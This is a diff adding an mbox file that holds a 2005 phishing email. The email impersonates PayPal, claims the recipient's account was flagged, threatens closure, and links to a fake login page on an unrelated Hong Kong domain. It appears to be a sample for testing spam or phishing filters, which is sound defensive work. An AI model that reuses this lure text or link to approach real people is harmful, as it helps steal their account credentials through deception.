@@ -1,0 +1,89 @@
+From nobody Sun Jan 25 13:49:55 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id D82272A88C
+ for <user@example.com>; Sun, 24 Jul 2005 06:50:28 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id C6362621C9F; Sun, 24 Jul 2005 06:50:28 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id A4753621C95
+ for <user@example.com>; Sun, 24 Jul 2005 06:50:28 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id GAA21508
+ for user@example.com; Sun, 24 Jul 2005 06:50:28 -0400
+Received: from clust07-www04.powweb.com (clust07-www04.powweb.com
+ [66.152.98.74]) by mail.example.com with ESMTP id GAA21500
+ for <user@example.com>; Sun, 24 Jul 2005 06:50:27 -0400
+Received: by clust07-www04.powweb.com (Postfix, from userid 148971)
+ id 3B4F71CAB1; Sun, 24 Jul 2005 03:50:27 -0700 (PDT)
+To: user@example.com
+Subject: Please Update Your Account Access 
+From: "service@paypal.com" <service@paypal.com>
+Content-Type: text/html
+Message-Id: <20050724105027.3B4F71CAB1@clust07-www04.powweb.com>
+Date: Sun, 24 Jul 2005 03:50:27 -0700 (PDT)
+Content-Length: 2217
+Lines: 57
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 54
+
+
+<html>
+<title>PayPal Billing Dept.</title>
+<p>Dear PayPal Member,</p>
+
+
+<p>PayPal is committed to maintaining a safe environment for its community of
+buyers and sellers. To protect the security of your account, PayPal employs
+some of the most advanced security systems in the world and our anti-fraud
+teams regularly screen the PayPal system for unusual activity.</p>
+
+<p>Recently, our Account Review Team identified some unusual activity in your
+account. In accordance with PayPal's User Agreement and to ensure that your
+account has not been compromised, access to your account was flagged. Your
+account will remain flagged until this issue has been resolved.
+This is a fraud prevention measure meant to ensure that your account is not
+compromised.</p>
+
+<p>In order to secure your account and quickly restore full access, we may
+require some specific information from you for the following reason:</p>
+
+<p>Our system requires further account verification.</p>
+
+<p>Case ID Number: PP-056-245-481
+We encourage you to log in and restore full access as soon as possible.
+Should your account remain flagged for an extended period of time,
+it may result in further limitations on the use of your account or
+may result in eventual account closure.</p>
+
+<p>-------------------------------------------------------------</p>
+<p>Please click on the link below to log in
+and restore full access to your account.</p>
+<table width="50%" cellpadding="1" cellspacing="0" border="0"
+bgcolor="#FFE65C" >
+				<tr>
+					<td>
+						<table width="100%" cellpadding="4" cellspacing="0" border="0"
+bgcolor="#FFFECD" align="center">
+							<tr>
+								<td class="pp_sansserif" align="center">
+                                <a href="http://www.yang.org.hk/images/paypal/error.html">Click here to activate your account</a></td>
+							</tr>
+						</table>
+					</td>
+				</tr>
+			</table>
+<p>-------------------------------------------------------------</p>
+
+<p>Thank you for your prompt attention to this matter. Please understand that
+this is a security measure meant to help protect you and your account. We
+apologize for any inconvenience.</p>
+
+
+<p>Sincerely,</p>
+<p>PayPal Account Review Department</p>
+
+<p>PayPal Email ID PP562</p>
